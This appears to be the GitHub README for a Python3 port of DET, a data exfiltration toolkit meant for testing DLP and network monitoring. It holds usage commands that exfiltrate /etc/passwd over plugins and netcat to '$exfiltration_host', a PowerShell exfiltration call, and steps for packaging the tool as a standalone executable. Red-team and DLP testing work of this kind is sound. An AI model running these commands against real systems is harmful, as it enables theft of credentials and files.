[![Black Hat Arsenal USA 2016](https://www.toolswatch.org/badges/arsenal/2016.svg)](https://www.blackhat.com/us-16/arsenal.html#det)  [![Black Hat Arsenal EU 2017](https://raw.githubusercontent.com/toolswatch/badges/master/arsenal/europe/2017.svg?sanitize=true)](https://www.blackhat.com/eu-17/arsenal/schedule/#det-data-exfiltration-toolkit-8717)

DET (extensible) Data Exfiltration Toolkit - Python3 Port
=======

DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time.

The idea was to create a generic toolkit to plug any kind of protocol/service to test implmented Network Monitoring and Data Leakage Prevention (DLP) solutions configuration, against different data exfiltration techniques.

# Features of this fork:
- Completely ported to **Python3**
- Made into a Python package (no setup.py for now)
- Fixed concurrency issues (the listener would not work correctly with multiple connections at the same time)
- Optimized the code a little and updated to work with newer libraries
- Added a script to build an exe with PyInstaller (Windows only)
- Fixed a bunch of issues

# Slides

DET has been presented at [BSides Ljubljana](https://bsidesljubljana.si/) on the 9th of March 2016 and the slides will be available here.
Slides are available [here](https://docs.google.com/presentation/d/11uk6d-xougn3jU1wu4XRM3ZGzitobScSSMUlx0MRTzg).

# Installation

Clone the repo: 

```bash
git clone https://github.com/lokiuox/DET.git
```

Then: 

```bash
pip install -r requirements.txt --user
```

# Configuration

In order to use DET, you will need to configure it and add your proper settings (eg. SMTP/IMAP, AES256 encryption
passphrase, proxies and so on). A configuration example file has been provided and is called: ```config-sample.json```

```json
{
    "plugins": {
        "http": {
            "target": "192.168.0.12",
            "port": 8080,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "google_docs": {
            "target": "conchwaiter.uk.plak.cc",
            "port": 8080 
        },        
        "dns": {
            "key": "google.com",
            "target": "192.168.0.12",
            "port": 53,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
[...SNIP...]
        "icmp": {
            "target": "192.168.0.12",
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "slack": {
            "api_token": "xoxb-XXXXXXXXXXX",
            "chan_id": "XXXXXXXXXXX",
            "bot_id": "<@XXXXXXXXXXX>:"
        },
        "smtp": {
            "target": "192.168.0.12",
            "port": 25,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "ftp": {
            "target": "192.168.0.12",
            "port": 21,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        },
        "sip": {
            "target": "192.168.0.12",
            "port": 5060,
            "proxies": ["192.168.0.13", "192.168.0.14"]
        }
    },
    "AES_KEY": "THISISACRAZYKEY",
    "max_time_sleep": 10,
    "min_time_sleep": 1,
    "max_bytes_read": 400,
    "min_bytes_read": 300,
    "compression": 1
}
```

# Usage

## Help usage

```bash
python det.py -h
usage: det.py [-h] [-c CONFIG] [-f FILE] [-d FOLDER] [-p PLUGIN] [-e EXCLUDE]
              [-L | -Z]

Data Exfiltration Toolkit (@PaulWebSec)

optional arguments:
  -h, --help  show this help message and exit
  -c CONFIG   Configuration file (eg. '-c ./config-sample.json')
  -f FILE     File to exfiltrate (eg. '-f /etc/passwd')
  -d FOLDER   Folder to exfiltrate (eg. '-d /etc/')
  -p PLUGIN   Plugins to use (eg. '-p dns,twitter')
  -e EXCLUDE  Plugins to exclude (eg. '-e gmail,icmp')
  -L          Server mode
  -Z          Proxy mode
```

## Server-side: 

To load every plugin:

```bash
python det.py -L -c ./config.json
```

To load *only* twitter and gmail modules: 

```bash
python det.py -L -c ./config.json -p twitter,gmail
```

To load every plugin and exclude DNS: 

```bash
python det.py -L -c ./config.json -e dns
```

## Client-side:

To load every plugin: 

```bash
python det.py -c ./config.json -f /etc/passwd
```

To load *only* twitter and gmail modules: 

```bash
python det.py -c ./config.json -p twitter,gmail -f /etc/passwd
```

To load every plugin and exclude DNS: 

```bash
python det.py -c ./config.json -e dns -f /etc/passwd
```
You can also listen for files from stdin (e.g output of a netcat listener):

```bash
nc -lp 1337 | python det.py -c ./config.json -e http -f stdin
```
Then send the file to netcat:

```bash
nc $exfiltration_host 1337 -q 0 < /etc/passwd
```
Don't forget netcat's `-q 0` option so that netcat quits once it has finished sending the file.

And in PowerShell (HTTP module): 

```powershell
PS C:\Users\user01\Desktop>
PS C:\Users\user01\Desktop> . .\http_exfil.ps1
PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
```

## Proxy mode:

In this mode the client will proxify the incoming requests towards the final destination.
The proxies addresses should be set in ```config.json``` file.

```bash
python det.py -c ./config.json -p dns,icmp -Z
```

# Standalone package

DET has been adapted in order to run as a standalone executable with the help of [PyInstaller](http://www.pyinstaller.org/).

```bash
pip install pyinstaller
```

The spec file ```det.spec``` is provided in order to help you build your executable.

```python
# -*- mode: python -*-

block_cipher = None

import sys
sys.modules['FixTk'] = None

a = Analysis(['det.py'],
             pathex=['.'],
             binaries=[],
             datas=[('plugins', 'plugins'), ('config-sample.json', '.')],
             hiddenimports=['plugins/dns', 'plugins/icmp'],
             hookspath=[],
             runtime_hooks=[],
             excludes=['FixTk', 'tcl', 'tk', '_tkinter', 'tkinter', 'Tkinter'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='det',
          debug=False,
          strip=False,
          upx=True,
          console=True )
```

Specify the modules you need to ship with you executable by editing the ```hiddenimports``` array.
In the example above, PyInstaller will package the DNS and ICMP plugins along with your final executable.
Finally, launch PyInstaller:

```base
pyinstaller det.spec
```

Please note that the number of loaded plugins will reflect on the size of the final executable.
If you have issues with the generated executable or found a workaround for a tricky situation, please open an issue so this guide can be updated for everyone.

# Modules

So far, DET supports multiple protocols, listed here: 

- [X] HTTP(S)
- [X] ICMP
- [X] DNS
- [X] SMTP/IMAP (Direct SMTP + Email service)
- [X] Raw TCP / UDP
- [X] FTP
- [X] SIP
- [X] PowerShell implementation (HTTP, DNS, ICMP, SMTP (used with Gmail))
- [X] Derived Unique Key Per Transaction (DUKPT) key management

And other "services": 
- [X] Github Gists
- [X] Google Docs (Unauthenticated)
- [X] Twitter (Direct Messages)
- [X] Slack

# Roadmap

- [X] Add proper encryption (eg. AES-256) Thanks to [ryanohoro](https://github.com/ryanohoro)
- [X] Compression (extremely important!) Thanks to [chokepoint](https://github.com/chokepoint)
- [X] Add support for C&C-like multi-host file exfiltration (Proxy mode)

# References

Some pretty cool references/credits to people I got inspired by with their project: 

- [Powershellery](https://github.com/nullbind/Powershellery/) from Nullbind.
- [PyExfil](https://github.com/ytisf/PyExfil), truely awesome. 
- [dnsteal](https://github.com/m57/dnsteal) from m57.
- [NaishoDeNusumu](https://github.com/3nc0d3r/NaishoDeNusumu) from 3nc0d3r.
- [Exphil](https://github.com/glennzw/exphil) from Glenn Wilkinson.
- WebExfile from Saif El-Sherei

# Contact/Contributing

(Original author's contact info)    
You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec).
Feel free if you want to contribute, clone, fork, submit your PR and so on.

# License

DET is licensed under a [MIT License](https://opensource.org/licenses/MIT).
